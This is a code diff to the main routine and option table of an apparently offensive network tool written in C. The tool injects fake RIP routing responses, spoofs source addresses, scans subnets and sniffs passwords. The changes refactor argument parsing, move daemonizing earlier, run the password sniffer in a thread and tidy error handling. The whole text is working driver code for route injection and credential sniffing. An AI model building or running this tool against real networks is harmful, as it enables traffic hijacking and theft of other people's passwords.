@@ -10,8 +10,10 @@ static struct neo_options opt[] = {
   {'n', required_argument, "rn/xrnab", "netmask", "netmask of the route"},
   {'g', required_argument, "rg/rxgab", "gateway", "default gateway"},
   {'m', required_argument, "rm/rmxab", "metric", "metric to the route"},
-  {'s', required_argument, "s/ar", "address", "spoofed source"},
-  {'x', no_argument, "x/xarbng", "address", "spoofed source"},
+//  {'s', required_argument, "s|ar", "address", "spoofed source"},
+  {'s', required_argument, NULL, "address", "spoofed source"},
+  {'+', 0, "s|ar", 0, 0},
+  {'x', no_argument, "x/xarbngd", "address", "spoofed source"},
   {'h', no_argument, NULL, NULL, "print help"},
   {'d', no_argument, "d/dc", NULL, "daemonize"},
   {'c', no_argument, "c/cd", NULL, "check injection"},
@@ -34,31 +36,31 @@ main (int argc, char **argv)
       switch (ch)
 	{
 	case 'b':
-	  strncpy (subnet, optarg, 19);
+	  strncpy (subnet, neoptarg, 19);
 	  flags ^= SCAN;
 	  break;
 	case 'x':
 	  flags ^= SNIFF;
 	  break;
 	case 's':
-	  sp00f = inet_addr (optarg);
+	  sp00f = inet_addr (neoptarg);
 	  flags ^= SPOOF;
 	  break;
 	case 'r':
-	  routes[0][0] = inet_addr (optarg);
+	  routes[0][0] = inet_addr (neoptarg);
 	  break;
 	case 'm':
-	  routes[3][0] = inet_addr (optarg);
+	  routes[3][0] = inet_addr (neoptarg);
 	  break;
 	case 'g':
-	  routes[2][0] = inet_addr (optarg);
+	  routes[2][0] = inet_addr (neoptarg);
 	  break;
 	case 'n':
-	  routes[1][0] = inet_addr (optarg);
+	  routes[1][0] = inet_addr (neoptarg);
 	  break;
 	case 'a':
-	  printf ("Reading file %s...\n\n", optarg);
-	  rip_file_read (optarg);
+	  printf ("Reading file %s...\n\n", neoptarg);
+	  rip_file_read (neoptarg);
 	  break;
 	case 'h':
 	  usage (argv[0]);
@@ -74,6 +76,15 @@ main (int argc, char **argv)
 	  break;
 	}
     }
+
+    if (flags & DAEMON)
+      {
+        if (fork ())
+          exit (0);
+      }
+    else
+       printf ("Press 'q' and Enter to exit\n\n");
+  
   if (flags & SCAN)
     {
       scan_net (subnet);
@@ -81,7 +92,8 @@ main (int argc, char **argv)
     }
   if (flags & SNIFF)
     {
-      sniff_passwd();
+      if (pthread_create (&pt, NULL, (void *) sniff_passwd, NULL))
+        fatal("Cannot create pthread!\n\n");
       wait();
       exit(0);
     }
@@ -91,19 +103,9 @@ main (int argc, char **argv)
     check_forward ();
   if (flags & SPOOF)
     localaddr = sp00f;
-  if (flags & DAEMON)
-    {
-      if (fork ())
-	exit (0);
-    }
-  else
-    printf ("\nPress 'q' and Enter to exit\n\n");
 
   if (pthread_create (&pt, NULL, (void *) send_fake_rip_response, NULL))
-    {
-      fprintf (stderr, "\nerror while creating the pthread\n");
-      exit (1);
-    }
+    fatal("Cannot create pthread!\n\n"); 
   if (flags & CHECK)
     {
       if (pthread_create (&pt1, NULL, (void *) check_injection, NULL))
